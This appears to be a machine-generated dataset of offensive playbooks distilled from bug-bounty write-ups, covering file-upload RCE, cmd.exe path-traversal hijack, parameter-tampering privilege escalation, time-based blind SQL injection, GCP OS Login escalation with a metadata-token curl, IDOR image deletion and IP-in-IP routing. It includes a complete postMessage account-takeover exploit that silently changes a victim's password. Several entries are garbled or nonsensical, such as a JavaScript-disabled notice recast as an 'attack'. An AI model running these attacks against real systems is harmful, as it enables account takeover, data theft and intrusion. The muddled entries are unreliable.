Accessing the uploaded file via its URL results in the execution of the script's code (e.g., displaying `phpinfo()` output).
failure_indicators: The application rejects the file upload with an error indicating an invalid file extension.
The application correctly identifies the file as a PHP script and does not execute it.
The uploaded file is saved but never executed by the server.

playbooks.impact: Remote Code Execution (RCE) on the target server, allowing the attacker to perform any action with the privileges of the web server process, including data theft, system compromise, or further exploitation.
playbooks.key_lesson: Always validate file extensions on upload endpoints, even if Content-Type and file content are validated, as servers may still execute files based on their perceived extension.

meta.title: Cmd Hijack - a command/argument confusion with path traversal in cmd.exe

affected_components: Processes launched via cmd.exe /c "..." where user-controlled input is part of the command argument

trigger_conditions.when_to_apply: When an application executes a command using `cmd.exe /c "..."` and a user-controlled argument is appended to a command that is not enclosed in quotes.
prerequisites: The target application must execute commands using `cmd.exe /c`.
User-controlled input must be part of the command argument.
The user-controlled input is not enclosed in single or double quotes.
The command executed does not perform strict sanitization of path traversal sequences.
applicability_signals: The application uses `cmd.exe /c` to run external commands.
The argument passed to the command is derived from user input.
The user input is not quoted by the application.
skip_if: The user input is properly quoted by the application (e.g., `cmd.exe /c "ping '127.0.0.1/../../...'"`).
The application uses `escapeshellarg()` instead of `escapeshellcmd()` for sanitizing arguments in PHP.

recon_steps: Step 1: Identify applications that execute external commands using `cmd.exe /c`.
Step 2: Analyze how user-controlled input is incorporated into the command line arguments. Look for instances where user input is appended to a command without being enclosed in quotes.
attack_steps: Step 1: Construct a payload by appending a path traversal sequence followed by a desired executable to the user-controlled argument.
Step 2: For example, if the original command is `cmd.exe /c "ping <USER_INPUT>"`, modify the user input to `127.0.0.1/../../../../../../../../../../windows/system32/calc.exe`.
Step 3: Observe the executed process and its command line for confirmation.
tools_recommended: Burp Suite: To intercept and modify HTTP requests containing user-controlled input that might be used in shell commands.
Sysmon: To monitor process creation events and analyze command lines for suspicious activity.
success_indicators: The intended arbitrary executable (e.g., `calc.exe`) is launched instead of the expected command (e.g., `ping.exe`).
Sysmon logs showing the arbitrary executable being launched with the constructed command line.
failure_indicators: The command executes as intended without launching the arbitrary executable (e.g., `ping.exe` still runs). This likely indicates the input was properly quoted or sanitized.
A `cmd.exe /c` error message related to invalid syntax.

playbooks.impact: Arbitrary Code Execution (ACE) by tricking `cmd.exe` into executing a different program than intended, or by leveraging path traversal to execute malicious binaries from unintended locations. This can lead to Denial of Service or Information Disclosure depending on the executed binary.
playbooks.key_lesson: When executing external commands with `cmd.exe /c`, always enclose user-controlled arguments in quotes to prevent path traversal and command argument confusion.

meta.title: From 3,99 to 1,650 USD (Part I) – Simple Vertical Privilege Escalation by Changing HTTP Response

affected_components: user account registration and login flow

trigger_conditions.when_to_apply: When a web application allows user registration with phone numbers and has different user roles with varying privileges.
prerequisites: Attacker can create at least two accounts, one with higher privileges (e.g., 'administrator') and one with lower privileges (e.g., 'staff').
Attacker has access to a virtual phone number service to bypass country code restrictions.
applicability_signals: User registration requires a phone number.
Different user roles exist within the application.
Application parameters like 'isAdm', 'isAdmin', 'isAdministrator', or 'Edit' are present in login requests or user data.
skip_if: Application strictly validates phone numbers against a known list of valid numbers without any bypass.
User roles are not determined by easily modifiable parameters.
WAF or server-side validation prevents modification of role-related parameters.

recon_steps: Step 1: Identify if phone number verification is a mandatory step during user registration.
Step 2: Register two accounts with different roles (e.g., administrator and staff) by obtaining virtual phone numbers from services like 2ndline or Hushed.
Step 3: Analyze the login requests and user profile data for parameters related to administrative privileges (e.g., 'isAdm', 'isAdmin', 'isAdministrator') or edit capabilities (e.g., 'Edit').
attack_steps: Step 1: Log in with the lower-privilege ('staff') account.
Step 2: Intercept the login request using a proxy (e.g., Burp Suite).
Step 3: Locate the parameter responsible for administrative privileges (e.g., 'isAdm') and change its value from 'false' to 'true'.
Step 4: Locate the parameter responsible for edit capabilities (e.g., 'Edit') and change its value to '1' (or an equivalent value indicating edit access).
Step 5: Forward the modified request and observe the user's access level.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests.
Virtual phone number services (e.g., 2ndline, Hushed): To bypass phone number country restrictions.
success_indicators: The 'staff' account gains administrative privileges after modifying the request.
The user can access administrative dashboards, settings, or perform actions previously restricted to administrators.
The 'Edit' parameter change grants the ability to modify application settings or configurations.
failure_indicators: Login fails after modifying parameters, or the privilege level remains unchanged.
A 403 Forbidden or similar error is returned, indicating authorization checks prevented the change.
The parameters 'isAdm', 'isAdmin', 'isAdministrator', or 'Edit' are not found or are server-side validated.
Pivot suggestion: If role parameters are not directly modifiable, investigate other privilege escalation vectors like insecure direct object references (IDOR) on user settings or API endpoints.

playbooks.impact: An attacker can escalate their privileges from a standard user to an administrator, allowing them to access sensitive information, modify system configurations, delete data, or perform other administrative actions that could compromise the entire application.
playbooks.key_lesson: Always test for privilege escalation by attempting to modify role-defining parameters during authentication or user data manipulation requests, especially when different user roles exist.

meta.title: Account takeover via postMessage

affected_components: postMessage handling logic within an inline chat widget

trigger_conditions.when_to_apply: When a web application uses `window.postMessage` to communicate between windows/iframes and performs an origin check that can be bypassed due to loose comparison (`null == undefined`) or an incomplete check.
prerequisites: Target must be using `window.postMessage` to receive messages from other origins.
The origin check must be susceptible to bypass (e.g., using `==` with `null` or `undefined`).
applicability_signals: JavaScript code that listens for `message` events.
Code that filters `this.chatInstancesDetail` based on `t.origin.toLowerCase() === e.domain.toLowerCase()`.
Subsequent use of `null !== e` which evaluates to true if `e` is `undefined` (due to `[].filter(...)[0]` returning `undefined` when no match is found).
skip_if: The origin check uses strict comparison (`===`) and correctly handles cases where no match is found.
The `postMessage` call explicitly checks for a specific origin and does not allow wildcard `*`.

recon_steps: Step 1: Analyze JavaScript code for `window.postMessage` usage and message handling functions.
Step 2: Examine the origin check logic within the `handleMessages` function. Specifically, look for patterns like `Array.prototype.filter(...)[0]` followed by a `null !==` check.
attack_steps: Step 1: Craft an HTML page that opens the target application in a new window using `window.open()`.
Step 2: Use `setInterval` to repeatedly send a `postMessage` to the opened window.
Step 3: The `postMessage` payload should contain a command that triggers a redirect to a `javascript:` URI.
Step 4: The `javascript:` URI should execute `eval(atob(payload))`, where the `payload` is a base64 encoded string containing malicious JavaScript.
Step 5: The malicious JavaScript payload should perform actions like stealing user data (e.g., email) and submitting a password change form.
Step 6: Include a mechanism to confirm successful execution (e.g., `window.opener.postMessage('attackSuccess','*');`).
payloads_or_patterns:
<script>
var ctx,interval,payload;
payload=btoa(` window.opener.postMessage('attackSuccess','*'); if(!window.cx){ window.cx=1; email=$('#currentCustomerEmail').val(); password='Hackerone123'; $('input[name=newPassword]').val(password); $('input[name=checkNewPassword]').val(password); $('input[name=checkNewPassword]').removeAttr("disabled"); alert('Hello '+email+' your password will be changed to: '+password); $('#updatePasswordForm').submit(); } `);
function attack(){
ctx=window.open("<TARGET_URL>/xxx");
sendPayload();
}
function sendPayload(){
interval=setInterval(function(){
ctx.postMessage({
'command': 'window-redirect',
'completionRedirectUrl': `javascript:eval(atob('${payload}'))`
},'*');
},500);
window.addEventListener("message",function(e){
if(e.data=="attackSuccess"){
clearInterval(interval);
}
});
}
attack();
</script>
tools_recommended: Browser Developer Console: For analyzing JavaScript and testing `postMessage` functionality.
Burp Suite: For intercepting and modifying requests, though less critical for this client-side exploit.
success_indicators: The target user's password is changed successfully.
An `attackSuccess` message is received by the attacker's listening window.
The malicious JavaScript successfully executes within the target's context, as indicated by alerts or other side effects.
failure_indicators: The `postMessage` is not received by the target window.
The origin check correctly filters out the attacker's origin.
The `javascript:` URI is not executed or is blocked by the browser.
Response 403 Forbidden when attempting to submit the password change form, indicating potential CSRF protection.

playbooks.impact: Full account takeover. An attacker can change the victim's password and gain unauthorized access to their account, potentially leading to data theft, financial loss, or further compromise.
playbooks.key_lesson: Always ensure `window.postMessage` origin checks use strict equality (`===`) and correctly handle cases where no match is found to prevent unintended communication and potential XSS vulnerabilities.

meta.title: Story of Blind SQL with a typo error.

affected_components: Product listing page taking product ID input

trigger_conditions.when_to_apply: When an application takes a product ID as input and displays product information, and standard SQL injection payloads are blocked, but there's a suspicion of case-sensitive filtering or typos in WAF rules.
prerequisites: An authenticated session token is available.
applicability_signals: The target application displays product information based on a product ID.
Direct SQL injection payloads like quotes or common keywords are blocked.
The `AND` keyword is not filtered properly, or its case-sensitive filtering can be bypassed.
skip_if: All common SQL injection attempts result in 4xx or 5xx errors without any observable difference.
The application does not display any user-supplied data back in the response.

recon_steps: Step 1: Use Burp Suite to capture requests to the product listing endpoint, noting the product ID parameter.
Step 2: Attempt basic SQL injection payloads (e.g., `'`, `"`, `OR 1=1`) to observe the application's response and filtering mechanisms.
attack_steps: Step 1: Send a request with the product ID `2 AND (select sleep(2)) -- -` to observe if the response time increases by approximately 2 seconds, indicating a successful time-based blind SQL injection.
Step 2: If the above is successful, proceed to enumerate table names by sending requests like `2 AND (select sleep(2) from {table_name}) -- -` for each table name in a provided wordlist.

Step 3: Once a valid table name is identified, enumerate column names by sending requests like `2 AND (select sleep(2) from {column_name}_table) -- -` (adjusting the pattern based on common naming conventions).

Step 4: Finally, extract data by sending requests like `2 AND (select sleep(2) from {table_name} where {column_name} = 'specific_value') -- -` or by attempting to extract specific fields like username or email.
tools_recommended: Burp Suite Intruder for automated payload testing and enumeration.
Custom Python script utilizing 'requests' library for precise timing checks and wordlist-based enumeration.
success_indicators: Response time increases by a noticeable amount (e.g., >2 seconds) when using `sleep(2)` in the payload.
The application responds successfully and without errors when injecting valid table and column names.
Successful extraction of sensitive data (e.g., usernames, emails) in subsequent steps.
failure_indicators: Consistent 4xx/5xx errors or no delay even with `sleep(2)` after successful initial injection attempts.
Specific table or column names trigger unexpected errors or filtering.
No discernible delay when testing different table/column names, indicating the initial `sleep(2)` might be a false positive or not working as expected.

playbooks.impact: Attacker can extract sensitive data from the application's database, including user credentials, personal information, and other confidential data, by exploiting the blind SQL injection vulnerability.
playbooks.key_lesson: Always test for case-sensitivity in WAF rules and keywords, as a simple typo or case difference (e.g., 'and' vs. 'AND') can bypass filters and lead to significant vulnerabilities like blind SQL injection.

meta.title: Three Privilege Escalation Bugs in Google Cloud Platform’s OS Login

trigger_conditions.when_to_apply: When an attacker has obtained SSH access to a Google Cloud Compute Engine instance with the 'compute.osLogin' IAM role, and the instance is running services like LXD or Docker, or is configured to use the metadata server.
prerequisites: Attacker has SSH access to a GCP Compute Engine instance with 'compute.osLogin' IAM role.
The instance is running LXD or Docker (for the first two vulnerabilities).
The instance is configured to use the metadata server (for the third vulnerability).
applicability_signals: The presence of LXD or Docker services on the instance.
The instance's network configuration allowing access to the metadata server (usually 169.254.169.254).
The ability to run commands as a non-administrative user on the instance.
skip_if: The instance does not have SSH access enabled or configured for the attacker.
The attacker only has 'compute.osAdminLogin' role (no privilege escalation needed).
LXD and Docker are not installed or accessible.
Metadata server is explicitly disabled or inaccessible.

recon_steps: Step 1: SSH into the GCP instance with the 'compute.osLogin' role.
Step 2: Run `id` command to confirm user privileges.
Step 3: Run `sudo -l` to check available sudo commands (should be none for this role).
Step 4: Check for the presence of LXD or Docker: `lxc --version`, `docker --version`.
Step 5: Attempt to access the metadata server: `curl http://169.254.169.254/`.
attack_steps: Step 1 (LXD/Docker Abuse): If LXD is present and the user can interact with it (e.g., start containers), abuse LXD's group permissions or host mounts to gain root access. If Docker is present, create a container with privileged access or mount sensitive host directories.

Step 2 (Metadata Server Hijacking): Intercept DHCP requests to obtain credentials or session tokens from the metadata server. This might involve manipulating network configurations or DNS settings to redirect traffic to a controlled endpoint that then forwards to the metadata server.
Step 3: Execute commands as root using the escalated privileges.
payloads_or_patterns: LXD/Docker abuse: Techniques vary, but often involve creating privileged containers, mounting `/` or `/host` from the host into the container, or exploiting specific service configurations.

Metadata Server Hijacking: `curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'` (to obtain credentials). The writeup suggests a DHCP hijacking mechanism which is more complex and involves manipulating network interfaces to proxy requests.
tools_recommended: SSH client (e.g., OpenSSH)
curl
netcat (for potential network manipulation)
Exploitation scripts tailored to LXD/Docker group abuse or DHCP hijacking.
success_indicators: Execution of commands as the root user (e.g., `whoami` returns `root`).
Ability to modify critical system files or read sensitive information not accessible to the OS Login user.
Successful retrieval of temporary credentials from the metadata server that can be used to interact with GCP APIs with elevated permissions.
failure_indicators: Commands fail with permission denied errors.
LXD/Docker commands are not available or restricted.
Metadata server requests time out or return errors.
If DHCP hijacking fails, consider other metadata access methods or exploitation of LXD/Docker directly if available.

playbooks.impact: Attacker can escalate privileges from a non-administrative user to root on the affected Google Cloud Compute Engine instance, allowing them to execute arbitrary commands, steal sensitive data, or compromise the entire instance.
playbooks.key_lesson: When interacting with cloud instances, always assume that local privilege escalation vectors might exist, especially if the instance provides access to services like container runtimes (Docker, LXD) or metadata servers, and ensure IAM roles are strictly limited to the principle of least privilege.

meta.title: Another image removal vulnerability on Facebook

affected_components: Series Feature (Poster Art/Cover Image creation and deletion)

trigger_conditions.when_to_apply: When an authenticated user can create or manage 'Series' in Facebook Creator Studio, specifically when these series involve image assets like Poster Art or Cover Images.
prerequisites: Attacker must have an authenticated Facebook account.
Target functionality must be accessible (e.g., Facebook Creator Studio).
applicability_signals: Presence of a 'Series Feature' in Facebook Creator Studio.
Ability to add images (Poster Art/Cover Image) when creating a series.
Network requests containing image IDs when interacting with the Series Feature.
skip_if: The Series Feature does not exist or does not handle image assets.
Image IDs are not sent in network requests or are not modifiable.

recon_steps: Step 1: Access Facebook Creator Studio and navigate to features related to content creation, specifically looking for a 'Series' feature.
Step 2: Attempt to create a series and observe network requests, particularly when adding Poster Art or Cover Images. Identify parameters that contain image IDs.
attack_steps: Step 1: While logged in, create a series in Facebook Creator Studio and upload an image (e.g., Poster Art). Intercept the request and capture the image ID associated with this upload.
Step 2: Modify the captured request to replace the original image ID with the image ID of a different user's image (e.g., a victim's image).
Step 3: Send the modified request to create a series containing the victim's image.
Step 4: Locate the option to delete the newly created series (which now points to the victim's image).
Step 5: Send a request to delete the series.
payloads_or_patterns:
Intercepted request to create/modify series, with target image ID replaced: `POST /api/v1/series/create HTTP/1.1
Host: creatorstudio.facebook.com
... 
{
  "series_name": "Modified Series",
  "image_id": "<VICTIM_IMAGE_ID>"
}
` (Endpoint and payload structure are illustrative and need to be derived from actual network traffic)
tools_recommended: Burp Suite: To intercept, modify, and resend HTTP requests.
Browser Developer Tools: To observe network traffic and identify relevant parameters.
success_indicators: The victim's image is removed from Facebook after deleting the attacker-controlled series.
Response code 200 or 204 on the deletion request, indicating successful operation.
failure_indicators: 403 Forbidden or 404 Not Found responses when trying to delete the series, indicating potential access control or invalid resource.
The victim's image is not removed, suggesting the series deletion did not affect the target image or the modification was rejected.

playbooks.impact: An authenticated attacker can delete any image (Poster Art or Cover Image) that is used in a 'Series' within Facebook Creator Studio, regardless of their ownership of the image or the series.
playbooks.key_lesson: When dealing with image manipulation features that involve user-uploaded content and a creation/management interface, always test for the ability to associate or re-associate content (like images) with different resources (like series) and observe the impact of subsequent management operations (like deletion).

meta.title: Privilege Escalation in Google Cloud Platform's OS Login

tech_stack_fingerprints: Uses GCP IAM, interacts with Google Cloud API

trigger_conditions.when_to_apply: When an attacker can control the SSH keys associated with a GCP project and can associate them with a user who has OS Login configured.
prerequisites: Attacker must be able to provision or modify SSH keys for a GCP project.
Target GCP project must have OS Login enabled.
Attacker must have control over an SSH client and access to the private key corresponding to the injected public key.
applicability_signals: Presence of OS Login configuration in GCP project settings.
Ability to add SSH keys to metadata for specific projects or instances.
The OS Login service documentation mentions user-specific SSH keys.
skip_if: OS Login is not enabled for the target GCP project.
The attacker lacks any means to inject SSH public keys into the GCP environment.

recon_steps: Step 1: Identify target GCP project and confirm OS Login is enabled via GCP console or gcloud CLI.
Step 2: Determine if OS Login allows associating SSH keys with specific users (e.g., by checking project or instance metadata configurations).
attack_steps: Step 1: Generate an SSH key pair (public and private).
Step 2: Associate the generated public SSH key with the attacker's user account within the GCP project's metadata, specifically targeting OS Login functionality.

Step 3: Attempt to SSH into a GCP instance within the target project using the corresponding private key. If the OS Login configuration is vulnerable, the attacker's user account may be granted elevated privileges (e.g., root access) on the instance.
Step 4: If direct SSH to instance fails, investigate other endpoints or services that might proxy OS Login functionality or rely on its credentials.
tools_recommended: gcloud CLI: For managing GCP resources and SSH keys.
ssh: For establishing SSH connection.
ssh-keygen: For generating SSH key pairs.
success_indicators: Successful SSH login to a GCP instance using the injected SSH key.
Gaining shell access with elevated privileges (e.g., root user) on the target instance.
Observation of the attacker's associated user account having elevated permissions on the instance via `whoami` or `id` commands.
failure_indicators: SSH login fails with 'Permission denied' errors, indicating the key is not recognized or authorized.
Login succeeds but with standard user privileges, indicating OS Login might be configured for access control but not privilege escalation through key injection.
Receiving an error during key injection, suggesting restrictions on metadata modification or key formatting.

playbooks.impact: Attacker can gain unauthorized, high-privileged access (e.g., root) to GCP virtual machine instances, potentially leading to complete compromise of the instance and any data it hosts or processes.
playbooks.key_lesson: When dealing with SSH key management in cloud environments, ensure that public keys associated with user accounts are strictly validated and do not grant unintended privilege escalation on associated compute resources.

meta.title: IP-in-IP protocol routes arbitrary traffic by default

tech_stack_fingerprints: Device responds to IP protocol number 4 (IP-in-IP)
IDS/IPS signature for IP-in-IP traffic (e.g., Snort rule alert ip any any -> any any (ip_proto:4;))

trigger_conditions.when_to_apply: This technique is applicable to network devices that process IP-in-IP encapsulated packets from any source to any destination without explicit configuration or authorization between the specific source and destination IP addresses.
prerequisites: The target network device must be configured to accept and process IP-in-IP encapsulated traffic.
The attacker must be able to send IP packets with protocol number 4 to the target device.
applicability_signals: The target device accepts IP packets with protocol number 4.
Network traffic analysis reveals unsolicited IP-in-IP packets being processed by the target device.
Device documentation mentions support for IP-in-IP tunneling without strict source/destination binding.
IDS logs show alerts for IP-in-IP traffic (protocol 4).
skip_if: The target device explicitly blocks IP protocol number 4.
The target device requires explicit configuration for IP-in-IP and does not accept arbitrary source/destination pairs.
A WAF or network firewall drops all IP packets with protocol number 4.

recon_steps: Step 1: Scan the target IP range for devices responding to ICMP echo requests (ping) or performing other active network probes to identify live hosts.

Step 2: Attempt to send IP packets with IP protocol number 4 to potential target devices and observe for any responses or packet forwarding behavior. This can be done using raw socket programming or specialized network tools. Monitor for any indications of traffic being routed or reflected.
attack_steps: Step 1: Construct an IP packet where the outer IP header has the source IP address controlled by the attacker and the destination IP address is the vulnerable device. Set the IP protocol field to 4 (IP-in-IP).
Step 2: Inside this outer IP packet, construct a second IP packet (the encapsulated packet). Set the source and destination IP addresses of this inner packet to the desired arbitrary traffic route.
Step 3: Send the crafted IP-in-IP packet to the vulnerable device.
Step 4: Observe the network traffic for any signs of the encapsulated traffic being routed through the vulnerable device to its intended destination, or for any reflective DDoS amplification.
payloads_or_patterns: Crafted IP packet with outer IP header (attacker_ip -> vulnerable_device_ip, protocol=4) containing an inner IP packet (arbitrary_source_ip -> arbitrary_destination_ip).
tools_recommended: Scapy: Python library for packet manipulation to craft and send IP-in-IP packets.
hping3: Network tool for sending custom TCP/IP packets, can be used to send packets with specific protocol numbers.
Wireshark/tcpdump: Network protocol analyzer to observe traffic and verify packet structures.
success_indicators: The encapsulated traffic is observed reaching its intended arbitrary destination IP address.
Network traffic analysis shows the vulnerable device acting as a router for the attacker-controlled traffic.
Reflected traffic from the intended destination is observed at the attacker's controlled monitoring point, indicating a potential reflective DDoS attack.
The vulnerable device's network logs indicate the processing and forwarding of IP-in-IP encapsulated packets.
failure_indicators: The target device drops or ignores IP packets with protocol number 4.
No evidence of encapsulated traffic reaching its intended destination or being routed by the vulnerable device.
Firewall or IDS blocks the IP-in-IP packets.
Failure to observe any network impact or traffic manipulation.

playbooks.impact: An unauthenticated attacker can route arbitrary network traffic through a vulnerable device. This can lead to reflective DDoS attacks, bypass of network access control lists, potential information disclosure by sniffing traffic passing through the device, or access to internal network resources not directly exposed to the internet.
playbooks.key_lesson: Verify that network devices correctly validate and restrict IP-in-IP (protocol 4) traffic, ensuring that it only accepts explicitly configured and authorized source/destination pairs to prevent unauthorized traffic routing.

meta.title: HackerOne report

trigger_conditions.when_to_apply: This technique is applicable when a web application, specifically HackerOne, requires JavaScript to be enabled for full functionality and interaction. It is a preliminary observation rather than an exploit.
prerequisites: Browser must be able to load the HackerOne website.
applicability_signals: The HackerOne website displays a prominent message: 'It looks like your JavaScript is disabled. To use HackerOne, enable JavaScript in your browser and refresh this page.'
skip_if: JavaScript is already enabled in the browser, or the user chooses not to enable it.

recon_steps: Step 1: Navigate to the HackerOne website (e.g., HackerOne.com) using a web browser.
Step 2: Observe the initial page load for any messages or prompts related to browser features or JavaScript.
attack_steps: Step 1: If the JavaScript disabled message appears, attempt to enable JavaScript in the browser's settings.
Step 2: Refresh the HackerOne page.
Step 3: Observe if the functionality of the HackerOne platform becomes accessible and the prompt disappears.
payloads_or_patterns: N/A - This is a configuration/environment check, not a payload-based attack.
tools_recommended: Web Browser Developer Tools (for toggling JavaScript settings)
success_indicators: The 'JavaScript is disabled' message disappears.
User interface elements and interactive features on HackerOne become available.
Login and other core functionalities can be accessed.
failure_indicators: The 'JavaScript is disabled' message persists after enabling JavaScript and refreshing the page.
The HackerOne platform remains non-functional.
This would indicate a deeper issue or that the prompt is misleading.

playbooks.impact: Ensures basic functionality of the HackerOne platform is available to the user. Failure to enable JavaScript limits interaction and access to reported bug bounties, potentially impacting a researcher's ability to participate.
playbooks.key_lesson: For web applications that rely heavily on JavaScript, ensure JavaScript is enabled in the browser to access full functionality and reporting capabilities.
